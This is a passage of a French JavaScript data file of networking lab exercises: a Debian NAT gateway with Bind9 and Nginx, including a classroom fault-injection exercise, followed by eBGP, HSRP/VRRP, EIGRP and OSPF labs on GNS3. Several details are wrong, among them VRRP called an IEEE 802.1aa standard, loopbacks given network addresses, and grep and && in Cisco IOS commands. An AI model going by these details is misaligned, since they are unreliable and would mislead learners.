          { os: "linux", cmd: "ip -br link", commentaire: "Identifier les noms des interfaces (ex: ens33/ens34 ou eth0/eth1)" }
        ],
        erreurs_courantes: [
          {
            symptome: "Une seule interface visible sur la VM1 au lieu de deux",
            cause: "La deuxième carte réseau n'a pas été ajoutée dans les paramètres de la VM avant démarrage",
            solution: "Éteindre la VM, ajouter l'interface dans les paramètres hyperviseur, redémarrer puis vérifier avec ip -br link"
          }
        ]
      },
      {
        titre: "Étape 2 — Configuration IP de la passerelle Debian (VM1)",
        contexte: "La VM1 est le coeur du réseau. Son interface WAN (ens33) obtient une IP dynamique du NAT de l'hyperviseur pour accéder à Internet. Son interface LAN (ens34) reçoit l'IP statique 192.168.2.254 qui sera la passerelle par défaut des VM2 et VM3.",
        commandes: [
          { os: "linux", cmd: "nano /etc/network/interfaces", commentaire: "Éditer la configuration réseau Debian (remplacer ens33/ens34 si nécessaire)" },
          { os: "linux", cmd: "# Contenu à insérer dans /etc/network/interfaces :\n# Interface WAN\nallow-hotplug ens33\niface ens33 inet dhcp\n\n# Interface LAN\nallow-hotplug ens34\niface ens34 inet static\n    address 192.168.2.254\n    netmask 255.255.255.0", commentaire: "Configuration WAN en DHCP et LAN en statique" },
          { os: "linux", cmd: "systemctl restart networking", commentaire: "Appliquer la configuration réseau" },
          { os: "linux", cmd: "ip a", commentaire: "Vérifier que ens34 affiche bien 192.168.2.254/24" }
        ],
        erreurs_courantes: [
          {
            symptome: "systemctl restart networking échoue avec une erreur sur ens34",
            cause: "Le nom d'interface dans le fichier ne correspond pas au nom réel détecté par Debian",
            solution: "Comparer le nom dans /etc/network/interfaces avec ip -br link et corriger la casse"
          }
        ]
      },
      {
        titre: "Étape 3 — Activation permanente de l'IP Forwarding",
        contexte: "Par défaut, Linux ne transfère pas les paquets entre ses interfaces. Il faut activer le forwarding IPv4 de manière persistante pour que la VM1 route le trafic entre le LAN VMnet2 et le WAN NAT.",
        commandes: [
          { os: "linux", cmd: "nano /etc/sysctl.conf", commentaire: "Ouvrir le fichier de paramètres noyau" },
          { os: "linux", cmd: "# Décommenter ou ajouter la ligne suivante :\nnet.ipv4.ip_forward=1", commentaire: "Activer le routage IPv4 de façon permanente" },
          { os: "linux", cmd: "sysctl -p", commentaire: "Recharger les paramètres sans redémarrer — doit afficher : net.ipv4.ip_forward = 1" },
          { os: "linux", cmd: "cat /proc/sys/net/ipv4/ip_forward", commentaire: "Vérification directe — doit retourner 1" }
        ],
        erreurs_courantes: [
          {
            symptome: "sysctl -p affiche 'net.ipv4.ip_forward = 0' après modification",
            cause: "La ligne est encore commentée (#) dans sysctl.conf",
            solution: "Retirer le # en début de ligne net.ipv4.ip_forward=1 puis relancer sysctl -p"
          }
        ]
      },
      {
        titre: "Étape 4 — NAT Masquerade avec iptables (VM1)",
        contexte: "Le NAT (Masquerade) permet aux VMs du LAN d'accéder à Internet en sortant avec l'IP WAN de la passerelle. La règle iptables doit être rendue persistante avec iptables-persistent pour survivre aux redémarrages.",
        commandes: [
          { os: "linux", cmd: "iptables -t nat -A POSTROUTING -o ens33 -j MASQUERADE", commentaire: "Ajouter la règle NAT sur l'interface WAN (adapter le nom si nécessaire)" },
          { os: "linux", cmd: "iptables -t nat -L POSTROUTING -n -v", commentaire: "Vérifier que la règle MASQUERADE est bien présente" },
          { os: "linux", cmd: "apt update && apt install iptables-persistent -y", commentaire: "Installer le paquet de persistance — répondre Oui pour sauvegarder les règles IPv4" },
          { os: "linux", cmd: "# Si iptables-persistent est déjà installé, sauvegarder manuellement :\nnetfilter-persistent save", commentaire: "Sauvegarde manuelle des règles dans /etc/iptables/rules.v4" }
        ],
        erreurs_courantes: [
          {
            symptome: "Les VMs du LAN ne pingent pas Internet après redémarrage de la passerelle",
            cause: "La règle iptables n'a pas été sauvegardée et disparaît au reboot",
            solution: "Installer iptables-persistent et relancer netfilter-persistent save, puis vérifier /etc/iptables/rules.v4"
          }
        ]
      },
      {
        titre: "Étape 5 — Configuration réseau des VM2 et VM3",
        contexte: "Les VM2 et VM3 doivent avoir une IP statique dans le réseau 192.168.2.0/24 avec la passerelle 192.168.2.254 (VM1). Le DNS doit pointer vers la VM2 (qui hébergera Bind9) une fois installé.",
        commandes: [
          { os: "linux", cmd: "# Sur VM2 — /etc/network/interfaces :\nallow-hotplug ens33\niface ens33 inet static\n    address 192.168.2.2\n    netmask 255.255.255.0\n    gateway 192.168.2.254\n    dns-nameservers 192.168.2.2", commentaire: "VM2 : IP fixe .2, gateway vers VM1, DNS local sur elle-même" },
          { os: "linux", cmd: "# Sur VM3 — /etc/network/interfaces :\nallow-hotplug ens33\niface ens33 inet static\n    address 192.168.2.10\n    netmask 255.255.255.0\n    gateway 192.168.2.254\n    dns-nameservers 192.168.2.2", commentaire: "VM3 : IP fixe .10, gateway vers VM1, DNS = VM2" },
          { os: "linux", cmd: "systemctl restart networking && ping -c 3 192.168.2.254", commentaire: "Redémarrer le réseau et tester la connectivité vers la passerelle" },
          { os: "linux", cmd: "ping -c 3 8.8.8.8", commentaire: "Tester l'accès Internet via le NAT de la VM1" }
        ],
        erreurs_courantes: [
          {
            symptome: "ping 8.8.8.8 fonctionne mais pas ping google.com",
            cause: "Le DNS n'est pas encore configuré (Bind9 pas encore installé) ou dns-nameservers mal défini",
            solution: "Tester d'abord ping 8.8.8.8 pour valider le routage, puis compléter après installation de Bind9"
          }
        ]
      },
      {
        titre: "Étape 6 — Installation de Bind9 et zone entreprise.local (VM2)",
        contexte: "Bind9 sera le DNS autoritaire pour la zone locale entreprise.local. Il résoudra les noms internes (www.entreprise.local → 192.168.2.2) et redirigera les requêtes externes vers Google et Cloudflare via les forwarders.",
        commandes: [
          { os: "linux", cmd: "apt update && apt install bind9 bind9utils -y", commentaire: "Installation de Bind9 sur la VM2" },
          { os: "linux", cmd: "# /etc/bind/named.conf.options — ajouter dans options {} :\nforwarders {\n    8.8.8.8;\n    1.1.1.1;\n};", commentaire: "Configurer les redirecteurs DNS externes" },
          { os: "linux", cmd: "# /etc/bind/named.conf.local — ajouter :\nzone \"entreprise.local\" {\n    type master;\n    file \"/etc/bind/db.entreprise.local\";\n};", commentaire: "Déclarer la zone locale dans Bind9" },
          { os: "linux", cmd: "# Créer /etc/bind/db.entreprise.local :\n$TTL 604800\n@ IN SOA ns.entreprise.local. admin.entreprise.local. (\n    2026062501 ; Serial\n    604800     ; Refresh\n    86400      ; Retry\n    2419200    ; Expire\n    604800 )   ; Negative TTL\n;\n@ IN NS ns.entreprise.local.\n@ IN A  192.168.2.2\nns IN A  192.168.2.2\nwww IN CNAME entreprise.local.", commentaire: "Fichier de zone avec enregistrements SOA, NS, A et CNAME" },
          { os: "linux", cmd: "named-checkconf && named-checkzone entreprise.local /etc/bind/db.entreprise.local", commentaire: "Valider la syntaxe de la config et du fichier de zone" },
          { os: "linux", cmd: "systemctl restart bind9 && systemctl status bind9", commentaire: "Redémarrer Bind9 et vérifier qu'il est actif" }
        ],
        erreurs_courantes: [
          {
            symptome: "named-checkzone retourne une erreur 'SERVFAIL'",
            cause: "Erreur de syntaxe dans le fichier de zone (point final manquant sur les FQDN ou mauvais serial)",
            solution: "Vérifier que tous les FQDN se terminent par un point (entreprise.local.) et que le serial est un entier valide"
          },
          {
            symptome: "Bind9 démarre mais nslookup entreprise.local échoue depuis VM3",
            cause: "Le fichier /etc/resolv.conf sur VM3 ne pointe pas vers 192.168.2.2",
            solution: "Vérifier cat /etc/resolv.conf sur VM3 — doit contenir 'nameserver 192.168.2.2'"
          }
        ]
      },
      {
        titre: "Étape 7 — Installation et configuration de Nginx (VM2)",
        contexte: "Nginx servira un site web accessible via http://www.entreprise.local depuis le client VM3. On crée un hôte virtuel dédié avec son propre dossier racine.",
        commandes: [
          { os: "linux", cmd: "apt install nginx -y && systemctl enable nginx", commentaire: "Installer Nginx et l'activer au démarrage" },
          { os: "linux", cmd: "# Créer /etc/nginx/sites-available/entreprise :\nserver {\n    listen 80;\n    server_name www.entreprise.local entreprise.local;\n\n    location / {\n        root /var/www/entreprise;\n        index index.html;\n    }\n}", commentaire: "Hôte virtuel Nginx pour la zone locale" },
          { os: "linux", cmd: "mkdir -p /var/www/entreprise\necho \"<h1>Production OK - Infrastructure Entreprise</h1>\" > /var/www/entreprise/index.html", commentaire: "Créer le dossier racine et la page d'accueil de test" },
          { os: "linux", cmd: "ln -s /etc/nginx/sites-available/entreprise /etc/nginx/sites-enabled/\nnginx -t && systemctl restart nginx", commentaire: "Activer le site, tester la config et redémarrer Nginx" },
          { os: "linux", cmd: "# Depuis VM3 — test de bout en bout :\ncurl http://www.entreprise.local\n# Doit retourner : <h1>Production OK - Infrastructure Entreprise</h1>", commentaire: "Validation complète : DNS + Nginx + routage fonctionnels" }
        ],
        erreurs_courantes: [
          {
            symptome: "curl retourne 'Failed to connect' depuis VM3",
            cause: "Nginx n'écoute que sur 127.0.0.1 ou le firewall bloque le port 80",
            solution: "Vérifier 'listen 80;' dans la config (sans adresse IP restrictive) et ss -tlnp | grep 80 sur VM2"
          }
        ]
      },
      {
        titre: "Étape 8 — Phase d'évaluation : injection et diagnostic de pannes",
        contexte: "Avant d'injecter les pannes, réaliser un snapshot 'PROD-OK' sur les 3 VMs. Le script sabotage_infra.sh introduit 3 pannes : désactivation du forwarding IP et flush du NAT sur VM1, corruption des forwarders DNS et du resolv.conf sur VM2. L'objectif est de diagnostiquer chaque panne avec les outils réseau et de les corriger.",
        commandes: [
          { os: "linux", cmd: "# Créer le script sur VM1 ET VM2 :\nnano /tmp/sabotage_infra.sh\n# Coller le code source fourni dans le document d'évaluation\nchmod +x /tmp/sabotage_infra.sh", commentaire: "Préparer le script de sabotage pédagogique sur les deux VMs" },
          { os: "linux", cmd: "# Sur VM1 uniquement :\nsudo /tmp/sabotage_infra.sh --passerelle\n# Effets : ip_forward=0 + flush règles NAT", commentaire: "Injecter les pannes sur la passerelle" },
          { os: "linux", cmd: "# Sur VM2 uniquement :\nsudo /tmp/sabotage_infra.sh --serveur\n# Effets : forwarder DNS invalide + resolv.conf corrompu", commentaire: "Injecter les pannes sur le serveur de services" },
          { os: "linux", cmd: "# Depuis VM3 — Outils de diagnostic :\nping -c 3 192.168.2.254          # Tester la couche 3 vers la gateway\nping -c 3 8.8.8.8                # Tester le routage Internet\nnslookup entreprise.local 192.168.2.2  # Tester la résolution DNS interne\ncurl http://www.entreprise.local  # Tester le service web\ntcpdump -i ens33 icmp            # Capturer les paquets ICMP (VM1)", commentaire: "Commandes de diagnostic à utiliser depuis le client et la passerelle" },
          { os: "linux", cmd: "# Corrections attendues sur VM1 :\nsysctl -w net.ipv4.ip_forward=1\niptables -t nat -A POSTROUTING -o ens33 -j MASQUERADE", commentaire: "Rétablir le forwarding et le NAT sur la passerelle" },
          { os: "linux", cmd: "# Corrections attendues sur VM2 :\n# 1. Corriger /etc/bind/named.conf.options : retirer 127.127.127.127 des forwarders\n# 2. Corriger /etc/resolv.conf : nameserver 192.168.2.2\nsystemctl restart bind9", commentaire: "Rétablir Bind9 et le resolver local sur le serveur" }
        ],
        erreurs_courantes: [
          {
            symptome: "ping 192.168.2.254 OK depuis VM3 mais ping 8.8.8.8 KO",
            cause: "IP Forwarding désactivé ou règle NAT manquante sur VM1",
            solution: "Sur VM1 : cat /proc/sys/net/ipv4/ip_forward (doit être 1) et iptables -t nat -L POSTROUTING (doit contenir MASQUERADE)"
          },
          {
            symptome: "ping 8.8.8.8 OK depuis VM3 mais nslookup google.com échoue",
            cause: "Forwarder DNS invalide (127.127.127.127) injecté dans named.conf.options",
            solution: "Corriger /etc/bind/named.conf.options, retirer l'IP invalide, relancer systemctl restart bind9"
          },
          {
            symptome: "nslookup entreprise.local échoue malgré Bind9 relancé",
            cause: "/etc/resolv.conf de VM2 pointe vers 192.0.2.55 (IP invalide injectée)",
            solution: "echo 'nameserver 192.168.2.2' > /etc/resolv.conf sur VM2 — vérifier avec cat /etc/resolv.conf"
          }
        ]
      }
    ],
    checklist: [
      "VM1 — ens34 affiche 192.168.2.254/24 (ip a)",
      "VM1 — /proc/sys/net/ipv4/ip_forward retourne 1",
      "VM1 — iptables -t nat -L POSTROUTING contient une règle MASQUERADE sur ens33",
      "VM1 — règles iptables persistantes après reboot (/etc/iptables/rules.v4 existe)",
      "VM2 — named-checkconf ne retourne aucune erreur",
      "VM2 — named-checkzone entreprise.local valide le fichier de zone",
      "VM2 — Nginx actif sur le port 80 (ss -tlnp | grep 80)",
      "VM3 — ping 8.8.8.8 fonctionne (routage NAT)",
      "VM3 — nslookup entreprise.local retourne 192.168.2.2",
      "VM3 — curl http://www.entreprise.local retourne la page HTML",
      "Snapshot PROD-OK réalisé sur les 3 VMs avant injection des pannes",
      "Rapport de troubleshooting complété avec symptômes, causes et solutions"
    ],
    tags: ["debian", "nat", "iptables", "bind9", "dns", "nginx", "virtualisation", "routage", "troubleshooting", "bts-sio", "sisr"],
    date_ajout: "2026-06-25",
    source: "École"
  },

  {
    id: 42,
    titre: "BGP eBGP — routage inter-AS entre deux systèmes autonomes",
    categorie: "reseau",
    niveau: "avancé",
    duree: 120,
    description: "Configurer eBGP entre deux routeurs Cisco IOS représentant deux AS distincts dans GNS3. Annonce de préfixes, analyse des tables BGP, manipulation d'AS-PATH et simulation de panne.",
    objectifs: [
      "Comprendre la notion d'AS et de peering BGP",
      "Configurer une session eBGP entre deux routeurs Cisco",
      "Annoncer des réseaux avec la commande network",
      "Analyser la table BGP et les attributs",
      "Manipuler l'AS-PATH avec une route-map (prepending)",
      "Simuler une panne et observer la reconvergence"
    ],
    prerequis: [
      { type: "logiciel", nom: "GNS3 2.2+ avec GNS3 VM (VMware ou VirtualBox)", lien: "https://gns3.com" },
      { type: "vm", nom: "2x Cisco IOSv 15.x (routeurs R1 et R2) — image .qcow2 compatible BGP" },
      { type: "reseau", nom: "Adressage : lien point-à-point 10.0.0.0/30, loopbacks 172.16.1.0/24 et 172.16.2.0/24" },
      { type: "reseau", nom: "Maîtrise d'OSPF ou du routage statique recommandée avant ce TP" }
    ],
    schema_reseau: null,
    etapes: [
      {
        titre: "Étape 1 — Topologie et interfaces",
        contexte: "R1 (AS 65001) et R2 (AS 65002) reliés par 10.0.0.0/30. Chacun a une Loopback simulant son réseau.",
        commandes: [
          { os: "linux", cmd: "R1(config)# interface GigabitEthernet0/0\nR1(config-if)# ip address 10.0.0.1 255.255.255.252\nR1(config-if)# no shutdown\nR1(config)# interface Loopback0\nR1(config-if)# ip address 172.16.1.0 255.255.255.0", commentaire: "Configurer R1 (AS 65001)" },
          { os: "linux", cmd: "R2(config)# interface GigabitEthernet0/0\nR2(config-if)# ip address 10.0.0.2 255.255.255.252\nR2(config-if)# no shutdown\nR2(config)# interface Loopback0\nR2(config-if)# ip address 172.16.2.0 255.255.255.0", commentaire: "Configurer R2 (AS 65002)" }
        ],
        erreurs_courantes: []
      },
      {
        titre: "Étape 2 — Configurer eBGP et vérifier",
        contexte: "remote-as différent du local-as déclenche automatiquement une session eBGP.",
        commandes: [
          { os: "linux", cmd: "R1(config)# router bgp 65001\nR1(config-router)# neighbor 10.0.0.2 remote-as 65002\nR1(config-router)# network 172.16.1.0 mask 255.255.255.0", commentaire: "BGP AS 65001 : peer R2, annoncer 172.16.1.0/24" },
          { os: "linux", cmd: "R2(config)# router bgp 65002\nR2(config-router)# neighbor 10.0.0.1 remote-as 65001\nR2(config-router)# network 172.16.2.0 mask 255.255.255.0", commentaire: "BGP AS 65002 : peer R1, annoncer 172.16.2.0/24" },
          { os: "linux", cmd: "R1# show bgp summary", commentaire: "Vérifier — session doit être Established" },
          { os: "linux", cmd: "R1# show bgp ipv4 unicast && R1# show ip route bgp", commentaire: "Table BGP et routes installées" }
        ],
        erreurs_courantes: [
          { symptome: "BGP reste en state ACTIVE", cause: "Connectivité TCP/IP absente entre les routeurs", solution: "Vérifier que ping 10.0.0.2 fonctionne depuis R1. BGP utilise TCP port 179." }
        ]
      },
      {
        titre: "Étape 3 — AS-PATH prepending et simulation de panne",
        contexte: "On allonge l'AS-PATH depuis R1 pour influencer la préférence de route chez R2, puis on simule une panne.",
        commandes: [
          { os: "linux", cmd: "R1(config)# route-map PREPEND permit 10\nR1(config-route-map)# set as-path prepend 65001 65001\nR1(config)# router bgp 65001\nR1(config-router)# neighbor 10.0.0.2 route-map PREPEND out", commentaire: "AS-PATH prepending — allonge de 2 sauts vers R2" },
          { os: "linux", cmd: "R2# clear ip bgp * soft\nR2# show bgp ipv4 unicast 172.16.1.0", commentaire: "Rafraîchir et vérifier l'AS-PATH allongé" },
          { os: "linux", cmd: "R1(config-if)# shutdown\nR2# show bgp summary", commentaire: "Simuler panne — session passe en Idle après ~90s" },
          { os: "linux", cmd: "R1(config-if)# no shutdown\nR2# show bgp summary", commentaire: "Rétablir — session revient Established" }
        ],
        erreurs_courantes: []
      }
    ],
    checklist: [
      "show bgp summary : session Established",
      "show bgp : 172.16.2.0/24 reçu de R2 marqué best (>)",
      "show ip route bgp : routes BGP dans la table de routage",
      "AS-PATH allongé visible chez R2 : 65001 65001 65001",
      "Simulation panne : session Idle après ~90s",
      "Rétablissement : session revient Established"
    ],
    tags: ["bgp", "ebgp", "as", "gns3", "cisco", "routage", "reseau", "avance"],
    date_ajout: "2026-06-26",
    source: "École"
  }
,

  {
    id: 75,
    titre: "HSRP & VRRP — redondance de passerelle par défaut",
    categorie: "reseau",
    niveau: "intermédiaire",
    duree: 75,
    description: "Configurer la redondance de passerelle avec HSRP (Hot Standby Router Protocol, Cisco propriétaire) et VRRP (Virtual Router Redundancy Protocol, standard IEEE). Deux routeurs partagent une IP virtuelle — si le routeur actif tombe, le second prend le relais automatiquement.",
    objectifs: [
      "Comprendre le fonctionnement de HSRP et VRRP",
      "Configurer HSRP entre deux routeurs Cisco sur GNS3",
      "Définir les priorités et le preempt",
      "Simuler une panne et observer le basculement",
      "Configurer VRRP comme alternative standard"
    ],
    prerequis: [
      { type: "logiciel", nom: "GNS3 2.2+ avec GNS3 VM (VMware ou VirtualBox)", lien: "https://gns3.com" },
      { type: "vm", nom: "2x Cisco IOSv 15.x (routeurs R1 et R2) — doivent supporter standby/vrrp" },
      { type: "vm", nom: "1x VM Debian 12 ou VPCS (client LAN pour tester la continuité de ping)" },
      { type: "reseau", nom: "Topologie : R1 (192.168.1.1/24) et R2 (192.168.1.2/24) sur le même segment LAN. VIP : 192.168.1.254" },
      { type: "reseau", nom: "Maîtrise du routage statique et des interfaces Cisco recommandée" }
    ],
    schema_reseau: null,
    etapes: [
      {
        titre: "Étape 1 — Topologie et adressage",
        contexte: "Deux routeurs R1 et R2 sont connectés au même segment LAN (192.168.1.0/24). Ils partagent l'IP virtuelle 192.168.1.254 présentée aux clients. R1 sera le routeur actif (priorité plus haute).",
        commandes: [
          { os: "linux", cmd: "# R1 :\nR1(config)# interface GigabitEthernet0/0\nR1(config-if)# ip address 192.168.1.1 255.255.255.0\nR1(config-if)# no shutdown", commentaire: "IP réelle de R1 sur le LAN" },
          { os: "linux", cmd: "# R2 :\nR2(config)# interface GigabitEthernet0/0\nR2(config-if)# ip address 192.168.1.2 255.255.255.0\nR2(config-if)# no shutdown", commentaire: "IP réelle de R2 sur le LAN" }
        ],
        erreurs_courantes: []
      },
      {
        titre: "Étape 2 — Configurer HSRP",
        contexte: "HSRP groupe 1 avec IP virtuelle 192.168.1.254. R1 a la priorité 110 (> 100 par défaut) et le preempt activé pour reprendre le rôle actif après une panne.",
        commandes: [
          { os: "linux", cmd: "# Sur R1 (routeur actif) :\nR1(config)# interface GigabitEthernet0/0\nR1(config-if)# standby 1 ip 192.168.1.254\nR1(config-if)# standby 1 priority 110\nR1(config-if)# standby 1 preempt\nR1(config-if)# standby 1 authentication md5 key-string MonSecret", commentaire: "HSRP groupe 1 : IP virtuelle + priorité haute + preempt + authentification MD5" },
          { os: "linux", cmd: "# Sur R2 (routeur standby) :\nR2(config)# interface GigabitEthernet0/0\nR2(config-if)# standby 1 ip 192.168.1.254\nR2(config-if)# standby 1 priority 90\nR2(config-if)# standby 1 preempt\nR2(config-if)# standby 1 authentication md5 key-string MonSecret", commentaire: "HSRP groupe 1 : même IP virtuelle, priorité basse" },
          { os: "linux", cmd: "R1# show standby brief", commentaire: "Vérifier : R1 = Active, R2 = Standby, VIP = 192.168.1.254" },
          { os: "linux", cmd: "R1# show standby", commentaire: "Détail HSRP : état, priorité, timers hello/hold, MAC virtuelle" }
        ],
        erreurs_courantes: [
          { symptome: "Les deux routeurs sont en état Active", cause: "Pas de connectivité entre R1 et R2 — ils ne reçoivent pas les hello HSRP", solution: "Vérifier que R1 et R2 sont sur le même segment (même switch ou lien direct). Ping 192.168.1.2 depuis R1 doit fonctionner." }
        ]
      },
      {
        titre: "Étape 3 — Simuler une panne et observer le basculement",
        contexte: "On éteint l'interface de R1 pour simuler une panne. R2 doit prendre le relais en moins de 10 secondes (3 hello manquants × hold timer).",
        commandes: [
          { os: "linux", cmd: "# Depuis la VM cliente : ping en continu vers la VIP\nping 192.168.1.254 -i 0.5", commentaire: "Lancer un ping continu depuis le client vers l'IP virtuelle" },
          { os: "linux", cmd: "# Sur R1 : simuler la panne\nR1(config)# interface GigabitEthernet0/0\nR1(config-if)# shutdown", commentaire: "Couper l'interface R1 — observer le basculement sur R2" },
          { os: "linux", cmd: "R2# show standby brief", commentaire: "R2 doit maintenant être en état Active" },
          { os: "linux", cmd: "# Rétablir R1 :\nR1(config-if)# no shutdown", commentaire: "R1 reprend le rôle Active grâce au preempt (priorité plus haute)" }
        ],
        erreurs_courantes: [
          { symptome: "Le basculement prend plus de 10 secondes", cause: "Timers HSRP par défaut : hello 3s, hold 10s", solution: "Réduire les timers : standby 1 timers msec 200 msec 600 (200ms hello, 600ms hold)" }
        ]
      },
      {
        titre: "Étape 4 — VRRP (standard IEEE 802.1aa)",
        contexte: "VRRP est le standard ouvert équivalent à HSRP. La syntaxe est similaire mais le routeur maître est appelé Master (non Active) et la priorité par défaut est 100.",
        commandes: [
          { os: "linux", cmd: "# Sur R1 (VRRP Master) :\nR1(config)# interface GigabitEthernet0/0\nR1(config-if)# vrrp 1 ip 192.168.1.254\nR1(config-if)# vrrp 1 priority 110\nR1(config-if)# vrrp 1 preempt", commentaire: "VRRP groupe 1 sur R1 — Master avec priorité 110" },
          { os: "linux", cmd: "# Sur R2 (VRRP Backup) :\nR2(config)# interface GigabitEthernet0/0\nR2(config-if)# vrrp 1 ip 192.168.1.254\nR2(config-if)# vrrp 1 priority 90", commentaire: "VRRP groupe 1 sur R2 — Backup avec priorité 90" },
          { os: "linux", cmd: "R1# show vrrp brief", commentaire: "Vérifier : R1 = Master, R2 = Backup" }
        ],
        erreurs_courantes: []
      }
    ],
    checklist: [
      "show standby brief : R1 = Active, R2 = Standby, VIP 192.168.1.254",
      "Ping depuis le client vers 192.168.1.254 : OK",
      "Shutdown interface R1 : R2 passe Active en < 10s",
      "No shutdown R1 : R1 reprend Active grâce au preempt",
      "show vrrp brief : R1 = Master, R2 = Backup"
    ],
    tags: ["hsrp", "vrrp", "redondance", "gateway", "cisco", "gns3", "haute-disponibilite", "reseau"],
    date_ajout: "2026-06-27",
    source: "École"
  },

  {
    id: 76,
    titre: "EIGRP — routage dynamique Cisco sur GNS3",
    categorie: "reseau",
    niveau: "intermédiaire",
    duree: 75,
    description: "Configurer EIGRP (Enhanced Interior Gateway Routing Protocol) entre plusieurs routeurs Cisco sur GNS3. Comprendre le fonctionnement DUAL, les métriques composites, les routes successeur et successeur faisable, et le résumé de routes.",
    objectifs: [
      "Activer EIGRP sur plusieurs routeurs Cisco",
      "Comprendre les métriques et le calcul DUAL",
      "Analyser la table de topologie EIGRP",
      "Configurer le résumé automatique et manuel des routes",
      "Simuler une panne et observer la reconvergence"
    ],
    prerequis: [
      { type: "logiciel", nom: "GNS3 2.2+ avec GNS3 VM (VMware ou VirtualBox)", lien: "https://gns3.com" },
      { type: "vm", nom: "3x Cisco IOSv 15.x (routeurs R1, R2, R3) en topologie triangle" },
      { type: "reseau", nom: "Adressage liens : R1-R2 = 10.0.12.0/30, R2-R3 = 10.0.23.0/30, R1-R3 = 10.0.13.0/30" },
      { type: "reseau", nom: "Loopbacks LAN : R1=192.168.1.1/24, R2=192.168.2.1/24, R3=192.168.3.1/24" },
      { type: "reseau", nom: "Routage statique et bases IP maîtrisés" }
    ],
    schema_reseau: null,
    etapes: [
      {
        titre: "Étape 1 — Topologie et adressage",
        contexte: "Trois routeurs R1, R2 et R3 en triangle. R1-R2 : 10.0.12.0/30, R2-R3 : 10.0.23.0/30, R1-R3 : 10.0.13.0/30. Chacun a une loopback simulant un réseau LAN.",
        commandes: [
          { os: "linux", cmd: "# R1 :\nR1(config)# interface Loopback0\nR1(config-if)# ip address 192.168.1.1 255.255.255.0\nR1(config)# interface GigabitEthernet0/0\nR1(config-if)# ip address 10.0.12.1 255.255.255.252\nR1(config-if)# no shutdown\nR1(config)# interface GigabitEthernet0/1\nR1(config-if)# ip address 10.0.13.1 255.255.255.252\nR1(config-if)# no shutdown", commentaire: "Interfaces R1 : loopback LAN + liens vers R2 et R3" },
          { os: "linux", cmd: "# R2 et R3 : même logique avec leurs adresses respectives\n# R2 : Lo0=192.168.2.1/24, G0/0=10.0.12.2, G0/1=10.0.23.1\n# R3 : Lo0=192.168.3.1/24, G0/0=10.0.13.2, G0/1=10.0.23.2", commentaire: "Adressage complet des trois routeurs" }
        ],
        erreurs_courantes: []
      },
      {
        titre: "Étape 2 — Configurer EIGRP",
        contexte: "On active EIGRP AS 100 sur les trois routeurs et on annonce tous les réseaux. Le numéro d'AS doit être identique sur tous les routeurs.",
        commandes: [
          { os: "linux", cmd: "# Sur R1, R2 et R3 (même configuration) :\nRouter(config)# router eigrp 100\nRouter(config-router)# network 0.0.0.0\nRouter(config-router)# no auto-summary\nRouter(config-router)# eigrp router-id 1.1.1.1", commentaire: "EIGRP AS 100 — network 0.0.0.0 annonce toutes les interfaces. Adapter le router-id (1.1.1.1 pour R1, 2.2.2.2 pour R2, etc.)" },
          { os: "linux", cmd: "R1# show eigrp neighbors", commentaire: "Vérifier les voisins EIGRP — R2 et R3 doivent apparaître" },
          { os: "linux", cmd: "R1# show ip route eigrp", commentaire: "Routes EIGRP apprises — marquées D dans la table de routage" }
        ],
        erreurs_courantes: [
          { symptome: "Aucun voisin EIGRP détecté", cause: "AS number différent entre les routeurs ou K-values incompatibles", solution: "Vérifier que tous les routeurs utilisent le même numéro d'AS (100). Les K-values doivent être identiques : show ip protocols | grep K" }
        ]
      },
      {
        titre: "Étape 3 — Analyser la table de topologie",
        contexte: "La table de topologie EIGRP contient toutes les routes connues avec leurs métriques. On identifie le Successeur (meilleure route) et le Successeur Faisable (backup pré-calculé).",
        commandes: [
          { os: "linux", cmd: "R1# show ip eigrp topology", commentaire: "Table de topologie complète — P = Passive (stable), A = Active (recalcul en cours)" },
          { os: "linux", cmd: "R1# show ip eigrp topology 192.168.3.0/24", commentaire: "Détail pour un réseau : Successeur (FD, AD) et Successeur Faisable si disponible" },
          { os: "linux", cmd: "R1# show ip eigrp topology all-links", commentaire: "Toutes les routes connues même sans Successeur Faisable" }
        ],
        erreurs_courantes: []
      },
      {
        titre: "Étape 4 — Résumé de routes et simulation de panne",
        contexte: "On configure le résumé manuel de routes sur R1 pour annoncer 192.168.0.0/22 au lieu de routes individuelles, puis on simule une panne.",
        commandes: [
          { os: "linux", cmd: "# Résumé manuel sur R1 vers R2 :\nR1(config)# interface GigabitEthernet0/0\nR1(config-if)# ip summary-address eigrp 100 192.168.0.0 255.255.252.0", commentaire: "Résumer 192.168.1-3.x en un seul préfixe /22" },
          { os: "linux", cmd: "R2# show ip route | grep 192.168", commentaire: "R2 ne doit voir qu'une seule route résumée 192.168.0.0/22" },
          { os: "linux", cmd: "# Simuler panne du lien R1-R2 :\nR1(config-if)# shutdown\nR2# show ip route eigrp", commentaire: "R2 doit converger via R3 — observer le temps de reconvergence" }
        ],
        erreurs_courantes: []
      }
    ],
    checklist: [
      "show eigrp neighbors : R2 et R3 voisins de R1",
      "show ip route eigrp : routes D vers 192.168.2.0 et 192.168.3.0 sur R1",
      "show ip eigrp topology : Successeur et FD/AD corrects",
      "Résumé 192.168.0.0/22 visible chez R2",
      "Panne R1-R2 : R2 converge via R3 en quelques secondes"
    ],
    tags: ["eigrp", "cisco", "gns3", "routage", "dual", "successeur", "reseau"],
    date_ajout: "2026-06-27",
    source: "École"
  },

  {
    id: 77,
    titre: "OSPF multi-zone — Area 0 et Area 1 sur GNS3",
    categorie: "reseau",
    niveau: "avancé",
    duree: 90,
    description: "Étendre OSPF avec plusieurs zones pour optimiser la scalabilité : une Area 0 (backbone) et une Area 1. Comprendre le rôle des ABR (Area Border Routers), les LSA inter-zones, les routes O et O IA, et configurer des routes résumées inter-zones.",
    objectifs: [
      "Comprendre la hiérarchie OSPF à plusieurs zones",
      "Configurer des interfaces dans Area 0 et Area 1",
      "Identifier le rôle d'ABR (Area Border Router)",
      "Analyser les LSA de type 1, 2 et 3",
      "Configurer le résumé inter-zone sur l'ABR"
    ],
    prerequis: [
      { type: "logiciel", nom: "GNS3 2.2+ avec GNS3 VM (VMware ou VirtualBox)", lien: "https://gns3.com" },
      { type: "vm", nom: "4x Cisco IOSv 15.x (R1 Area0, R2 ABR Area0+Area1, R3 Area1, R4 Area1)" },
      { type: "reseau", nom: "Adressage : Area0 = R1(10.0.12.1)-R2(10.0.12.2)/30 | Area1 = R2(10.0.23.1)-R3(10.0.23.2)-R4(10.0.34.2)/30" },
      { type: "reseau", nom: "Loopbacks : R1=1.1.1.1/32, R2=2.2.2.2/32, R3=3.3.3.3/32, R4=4.4.4.4/32" },
